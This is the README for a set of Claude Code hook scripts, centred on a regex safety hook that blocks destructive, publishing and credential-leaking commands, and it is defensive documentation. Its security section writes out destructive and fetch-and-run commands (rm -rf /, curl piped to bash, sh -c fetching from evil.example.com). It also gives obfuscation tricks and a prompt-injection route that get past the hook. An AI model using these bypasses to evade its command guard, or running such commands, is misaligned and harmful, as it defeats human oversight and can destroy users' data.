# Hooks

Node.js scripts that run automatically on Claude Code tool events. The installer wires them into `.claude/settings.json`.

**Cross-platform:** All hooks run on Node.js (>= 20). One implementation for Windows, macOS, and Linux. No external dependencies — pure stdlib.

## Interface

**Inputs:** Each hook script is run by Claude Code on its event and reads one JSON object on **stdin** (tool-call context; see *Hook I/O protocol* below). Environment: `CLAUDE_HARNESS_WORK_ROOT` (required by `catalog-skills.js`) and `CLAUDE_HARNESS_DRIFT_LEVEL` (`mvp` default, or `full`). Running a hook by hand with no stdin works: it detects a TTY or empty stdin and exits cleanly.

**Outputs:** JSON on **stdout** and/or an exit code: `{"decision":"deny","reason":"..."}` with exit 2 (PreToolUse), `{"decision":"block","reason":"..."}` (PostToolUse), or `{"hookSpecificOutput":{"hookEventName":"<event>","additionalContext":"..."}}` for a soft hint. Files written: a marker in `tasks/todo.md` (`pre-compact.js`), `tasks/sessions.jsonl` (`session-log.js`), `tasks/.learnings-injected-<session_id>.json` (`session-context.js`, read back and scored by `session-log.js`), `SKILLS_CATALOG.md` in the work root (`catalog-skills.js`), and `tasks/todo.md` re-rendered through `trackers/lib/render-todo.sh` (`todo-render-trigger.js`). The session hooks also read `.claude/.harness-manifest.json` (`session-start-msg.js`, `session-router.js`, `tracker-sync.js`) and the learnings folders `.claude/learnings/` and `~/.claude/learnings/` (`session-context.js`); `tracker-sync.js` calls `.claude/trackers/active/close-issue.sh` to close an item on explicit written evidence.

**Callable parts:** The hook scripts `safety-check.js`, `catalog-trigger.js`, `catalog-skills.js`, `drift-check.js`, `pre-compact.js`, `session-log.js`, `inventory-check.js`, `session-start-msg.js`, `session-context.js`, `session-router.js`, `tracker-sync.js` and `todo-render-trigger.js` (each described in the table under *Scripts in this folder*). Every script there except `catalog-skills.js` (spawned by `catalog-trigger.js`) and `todo-render-trigger.js` is wired into `.claude/settings.json` by the installer (`install/lib/substitution.js`, `buildSettings`). `todo-render-trigger.js` is a `PostToolUse` hook on `Write|Edit`, but nothing in `install/` references it: the installer does not wire it, so it runs only if someone adds it to `settings.json` by hand. Files other modules require: `lib/walk.js` (`walk`, a recursive directory walk with a predicate filter; used by `install/lib`) and `lib/frontmatter.js` (`parse`, the minimal YAML frontmatter parser; used by `scripts/lib`).

**Never breaks:** Pure Node.js stdlib, no runtime dependencies; runs on Node >= 20 on Windows, macOS and Linux. A hook never throws into Claude Code: `runHook` turns a timeout, exception or rejection into an envelope. The safety hook is accidental-command oversight, not a sandbox (*Security* below).

---

## Scripts in this folder

| Script | Hook event | Matcher | What it does |
|---|---|---|---|
| `safety-check.js` | `PreToolUse` | `Bash\|Write` | Blocks destructive git, file, Azure, and database operations before they run. Blocks writes that look like hardcoded secrets. |
| `catalog-trigger.js` | `PostToolUse` | `Write\|Edit` | When a skill, agent, or command file is edited, spawns `catalog-skills.js` in the background |
| `catalog-skills.js` | (called by trigger) | — | Scans all skills, agents, and hooks across `CLAUDE_HARNESS_WORK_ROOT` + `~/.claude/` and writes `SKILLS_CATALOG.md` to the work root |
| `drift-check.js` | `PostToolUse` | `Write\|Edit` | When one of the 7 enterprise task files is edited, checks cross-file invariants. Soft-warns on enum mismatches, hard-blocks on people.md ↔ flags-and-notes.md cross-reference drift (directs user to `/sync-tasks`). Set `CLAUDE_HARNESS_DRIFT_LEVEL=full` to also check branch naming + sprint story brief.md presence. |
| `pre-compact.js` | `PreCompact` | `*` | Appends a timestamp marker to `tasks/todo.md` and injects a reminder for Claude to save its in-progress state |
| `session-log.js` | `SessionEnd` | `*` | Appends a JSONL line to `tasks/sessions.jsonl` with timestamp, session ID, branch, and story ID |
| `inventory-check.js` | `PreToolUse` | `Bash` | Fires only on `git commit`. Hard-blocks a new skill or agent with no README row, README skill or agent counts that differ from the tree, a `VERSION` bump with an empty CHANGELOG `[Unreleased]`, and `VERSION` and `package.json` disagreeing; soft-warns on changelog and landing-page drift. Reads the staged files; writes nothing. |
| `session-start-msg.js` | `SessionStart` | `*` | Reads `.claude/.harness-manifest.json` (tracker, workflow pack, mirror) and prints a tracker-aware startup message, with a warning when a skill is shadowed. Writes nothing. |
| `session-context.js` | `SessionStart` | `*` | Reads project and global learnings, injects the top 5 as a soft hint, and writes `tasks/.learnings-injected-<session_id>.json` so `session-log.js` can score them. |
| `session-router.js` | `SessionStart` | `*` | Detects whether the project is new or active from the planning artifacts and open tracker items, and injects a next-step prompt. Writes nothing. |
| `tracker-sync.js` | `SessionStart` (`start`), `SessionEnd` (`end`) | `*` | `start` reports open items that look delivered, notices `tasks/todo-manual-backup.md`, and regenerates the mirror in `both` mode; `end` closes items that have explicit written evidence (merged PRs with closing keywords or `Task:` trailers) through the active tracker's `close-issue.sh`, and regenerates the mirror in `both` mode only when it closed at least one item. |
| `todo-render-trigger.js` | `PostToolUse` (not wired by the installer) | `Write\|Edit` | When a file under `tasks/issues/` is edited in `local` tracker mode, re-renders `tasks/todo.md` with `trackers/lib/render-todo.sh`. |
| `lib/hook-io.js` | (shared lib) | — | stdin JSON read + stdout JSON write helpers |
| `lib/frontmatter.js` | (shared lib) | — | Minimal YAML frontmatter parser for SKILL.md / agent.md |
| `lib/walk.js` | (shared lib) | — | Recursive directory walk with predicate filter |

---

## Configuration

`catalog-skills.js` requires `CLAUDE_HARNESS_WORK_ROOT` — the folder containing your projects. The installer writes this into the `env` block of `settings.json`:

```json
{
  "env": {
    "CLAUDE_HARNESS_WORK_ROOT": "/home/username/projects"
  },
  ...
}
```

Or export it in your shell if running manually:

```bash
export CLAUDE_HARNESS_WORK_ROOT="$HOME/projects"
node ~/.claude/hooks/catalog-skills.js
```

### Optional: extended drift detection

Set `CLAUDE_HARNESS_DRIFT_LEVEL=full` (default `mvp`) to enable two extra invariants in `drift-check.js`:

- **Branch naming** — every Branch entry in `pr-queue.md` must match `feature/`, `fix/`, `hotfix/`, or `chore/` prefix.
- **Sprint story ↔ brief.md** — every active sprint story (status `In Progress`, `Code Review`, `Blocked`) must have `tasks/stories/<id>/brief.md`.

Both are soft warnings only. They're opt-in to keep hook latency predictable on every edit.

```json
{
  "env": {
    "CLAUDE_HARNESS_WORK_ROOT": "/path/to/projects",
    "CLAUDE_HARNESS_DRIFT_LEVEL": "full"
  }
}
```

### Tests

Unit tests use `node:test` (no runtime deps; `npm install` brings in eslint and c8 for development only):

```bash
npm test                 # all hook + tracker tests
npm run test:hooks       # hooks only
npm run test:trackers    # tracker conformance suite
npm run test:coverage    # with c8 coverage report
```

110 hook tests + 19 tracker conformance tests = 129 total (v1.5):

- `safety-check.test.js` — 72 cases: every BASH_RULES entry, false-positive negatives, ACR/docs allowlists, secret heuristic, out-of-scope tools.
- `hook-io.test.js` — 13 cases: runHook timeout/exception/rejection envelopes, readStdinJson error logging, recordMetric schema, appendWithRotation thresholds + pruning.
- `drift-check.test.js` — 12 cases: all 6 drift invariants (positive, negative, placeholder).
- `frontmatter.test.js` — 10 cases: YAML edge cases.
- `session-log.test.js` — 3 cases: append-on-fresh, append-preserves, 10 MB rotation.
- `trackers/__tests__/conformance.test.js` — 19 cases: arg validation, happy-path golden match, failure modes, retry-and-succeed, contract presence (×2 adapters).

### Threat model

Read *Security* below before adding new safety rules or relying on the hook for anything beyond accidental-command oversight. The safety hook is **not** a sandbox.

---

## Hook wiring in settings.json

The installer generates `.claude/settings.json` with the hooks wired up. This is the structure it writes; if it ever differs, `buildSettings` in `install/lib/substitution.js` is the source of truth:

```json
{
  "env": {
    "CLAUDE_HARNESS_WORK_ROOT": "/path/to/your/projects"
  },
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash|Write",
        "hooks": [{ "type": "command", "command": "node \"/path/to/.claude/hooks/safety-check.js\"" }]
      },
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "node \"/path/to/.claude/hooks/inventory-check.js\"" }]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Write|Edit",
        "hooks": [
          { "type": "command", "command": "node \"/path/to/.claude/hooks/catalog-trigger.js\"" },
          { "type": "command", "command": "node \"/path/to/.claude/hooks/drift-check.js\"" }
        ]
      }
    ],
    "PreCompact": [
      {
        "matcher": "*",
        "hooks": [{ "type": "command", "command": "node \"/path/to/.claude/hooks/pre-compact.js\"" }]
      }
    ],
    "SessionStart": [
      {
        "matcher": "*",
        "hooks": [
          { "type": "command", "command": "node \"/path/to/.claude/hooks/session-start-msg.js\"" },
          { "type": "command", "command": "node \"/path/to/.claude/hooks/session-context.js\"" },
          { "type": "command", "command": "node \"/path/to/.claude/hooks/session-router.js\"" },
          { "type": "command", "command": "node \"/path/to/.claude/hooks/tracker-sync.js\" start" }
        ]
      }
    ],
    "SessionEnd": [
      {
        "matcher": "*",
        "hooks": [
          { "type": "command", "command": "node \"/path/to/.claude/hooks/session-log.js\"" },
          { "type": "command", "command": "node \"/path/to/.claude/hooks/tracker-sync.js\" end" }
        ]
      }
    ]
  }
}
```

The `env` block (`CLAUDE_HARNESS_WORK_ROOT`) is written only for a global install with a work root. Paths are filled in by the installer (`install/install.js`; `install/install.sh` forwards to it). `todo-render-trigger.js` and `catalog-skills.js` are not listed: the first is not wired by the installer and the second is spawned by `catalog-trigger.js`.

---

## Hook I/O protocol

- Hooks receive tool-call context as JSON on **stdin**.
- Hooks respond on **stdout** with JSON and/or an exit code.
- **PreToolUse** hooks deny by writing `{"decision":"deny","reason":"..."}` and exiting 2. This prevents the tool call.
- **PostToolUse** hooks cannot undo the call (it already ran), but can write `{"decision":"block","reason":"..."}` to tell Claude to stop before further edits.
- Soft context injection (non-blocking hint) uses `{"hookSpecificOutput":{"hookEventName":"<event>","additionalContext":"..."}}`.
- Running any hook manually with no stdin works — the helper detects a TTY or empty stdin and exits cleanly.

---

## All Claude Code hook events

| Event | Fires when |
|---|---|
| `SessionStart` | A new session begins |
| `PreToolUse` | Before a tool call executes — exit code 2 blocks the call |
| `PostToolUse` | After a tool call succeeds |
| `PostToolUseFailure` | After a tool call fails |
| `PreCompact` | Before context window compaction |
| `PostCompact` | After context window compaction |
| `Stop` | Claude finishes responding |
| `UserPromptSubmit` | User submits a prompt, before Claude processes it |
| `InstructionsLoaded` | A CLAUDE.md or rules file is loaded |
| `PermissionRequest` | A permission dialog appears |
| `Notification` | Claude Code sends a notification |
| `SubagentStart` | A sub-agent is spawned |
| `SubagentStop` | A sub-agent finishes |
| `TaskCompleted` | A task is marked as completed |
| `ConfigChange` | A configuration file changes during a session |
| `WorktreeCreate` | A worktree is being created |
| `WorktreeRemove` | A worktree is being removed |
| `TeammateIdle` | An agent team teammate is about to go idle |
| `Elicitation` | An MCP server requests user input |
| `ElicitationResult` | After user responds to an MCP elicitation |
| `SessionEnd` | A session terminates |

---

## Security

This section describes what the hooks in this directory protect against — and, importantly, what they do **not** protect against. Read this before adding rules or relying on the safety hook.

### TL;DR

`safety-check.js` is a **human-in-loop oversight gate**, not a sandbox. It catches accidental destructive commands typed by Claude or copied from documentation. It is **not** designed to stop a sophisticated adversary or even a moderately motivated one.

If your threat model includes hostile prompt injection, untrusted user input, or supply-chain attacks, you need additional controls outside this hook (containerization, restricted IAM roles, network egress controls, code review).

---

### What the hooks protect against

`safety-check.js` (PreToolUse) blocks the tool call before it runs. It catches:

- **Accidental destructive commands typed plainly**: `rm -rf /`, `git reset --hard`, `git branch -D main`, `Remove-Item -Recurse -Force`, `del /f`.
- **Cloud resource deletions**: `az group delete`, `az keyvault delete`, `az sql server delete`, etc. — the things that ruin a Friday afternoon.
- **SQL destruction**: `DROP TABLE`, `TRUNCATE TABLE`, `DELETE FROM` invoked through Bash (e.g. `sqlcmd`, `psql`). Note: only Bash invocations, not when these strings appear inside a Write to a `.md` file.
- **Process kills**: `taskkill /f`, `kill -9`, `Stop-Process -Force`.
- **Package publishing**: `npm publish`, `dotnet nuget push` — irreversible operations.
- **Git operations needing approval**: `git commit`, `git push` — by policy these need human sign-off. To let Claude commit and push without a prompt, set `SAFETY_ALLOW_GIT_COMMIT_PUSH=1` in the `env` block of `~/.claude/settings.json`. That lifts only these two prompts; every destructive rule above still applies. The run's git wrapper (`worktree.js git -- <args>`) is judged as the git command after the `--` (and a leading `-C <dir>` or `-c <k=v>` is ignored for the judgement), so a wrapped commit or push asks and a denied form denies exactly as when typed directly; the wrapper itself runs only `add`, `commit -F`, `restore` and `push -u origin <branch>` (only the branch checked out in its folder, never main, master or a ref) and refuses everything else. The ask rules read the raw command as well, so a commit or push hidden in a `-C`/`-c` value still asks.
- **Plain-text supply chain risks**: `curl … | bash`, `wget … | sh`, `iex … web…`.
- **Plain-text credential leaks**: `curl …password=…`, `echo $API_KEY`, `printenv`.
- **Hardcoded secrets in Write content**: PEM private-key headers, or the heuristic "long token + secret-keyword" combo. Skipped for `.md`/`.mdx`/`.rst`/`.txt` and any `docs/` path so docs can quote the patterns.

`drift-check.js` (PostToolUse) protects task-file consistency, not security.

`session-log.js`, `pre-compact.js`, `catalog-trigger.js` are housekeeping. They have no security role.

---

### What the hooks do NOT protect against

Anything that obscures the command from a literal regex match. Treat this list as adversarial — every example below bypasses `safety-check.js`:

#### Encoding / decoding tricks
```bash
eval "$(echo cm0gLXJmIC8= | base64 -d)"     # base64-encoded `rm -rf /`
echo -e '\x72\x6d\x20\x2d\x72\x66' | bash   # hex-escaped
```

#### Variable indirection
```bash
X='rm -rf /'; bash -c "$X"
CMD=rm; FLAGS=-rf; $CMD $FLAGS /
```

#### IFS / globbing splits
```bash
{r,m}\ -rf\ /
r''m -rf /
```

#### Heredoc obfuscation
```bash
bash <<'EOF'
rm -rf /
EOF
```

#### Indirect invocation
```bash
sh -c "$(curl -s evil.example.com/script.sh)"   # the curl rule may catch this; the inner content is unseen
alias dropdb='psql -c "DROP TABLE users"'; dropdb
```

#### Tool-surface evasion
- A command run via the `Edit` tool's pre/post hooks (out of scope for safety-check).
- A command issued through an MCP server tool whose name is not `Bash` or `Write`.
- A command embedded in a script file written via `Write`, then later executed via `Bash`.

#### Adversarial prompt injection
If a malicious document convinces Claude to use a non-Bash tool (e.g. an MCP server's `execute_remote_command`), `safety-check.js` never sees it. The hook only matches on `tool_name === 'Bash' | 'Write'`.

---

### Actors and trust

| Actor | Trust level | Protected? |
|---|---|---|
| Claude generating obvious destructive commands by mistake | Trusted but fallible | **Yes** |
| Claude copying from docs / examples that include destructive shapes | Trusted but fallible | **Yes** |
| Operator typing dangerous commands into an Agent-mode prompt | Trusted but fallible | **Yes** |
| Adversarial prompt injection trying to bypass the regex | Hostile | **No** |
| A malicious MCP server | Hostile | **No** — outside the Bash/Write surface |
| A compromised dependency that runs `rm -rf` at install time | Hostile | **No** — the install runs before/outside the hook |
| A user who knows shell tricks and wants to bypass | Hostile | **No** |

If your threat model includes the bottom four rows, run Claude inside a container with restricted IAM, no production network egress, and no production credentials mounted.

---

### How to extend the rules

Add to either `BASH_RULES` or `WRITE_RULES` in [safety-check.js](safety-check.js):

```js
{ id: 'short-id', re: /\bsome\s+regex\b/i, reason: 'human-readable reason' }
```

- **`id`**: short identifier emitted to `tasks/metrics.jsonl` so you can track which rules fire most often via `/improve-harness`.
- **`re`**: a regex applied with `.test()`. Use word boundaries (`\b`) to avoid substring matches (e.g. `confirm` matching `rm`).
- **`reason`**: shown to Claude when the deny fires; should suggest the safer alternative.

When adding a rule, also add a positive **and** negative test case to [__tests__/safety-check.test.js](__tests__/safety-check.test.js). The negative case is more important — it documents the false-positive boundary you intend.

---

### Reporting issues

If you discover a bypass that should have been caught (i.e. a plain command that the rules miss), open an issue or add a rule + test in the same PR. If you discover an exploit that requires obfuscation, that is by design — see "Actors and trust" above.
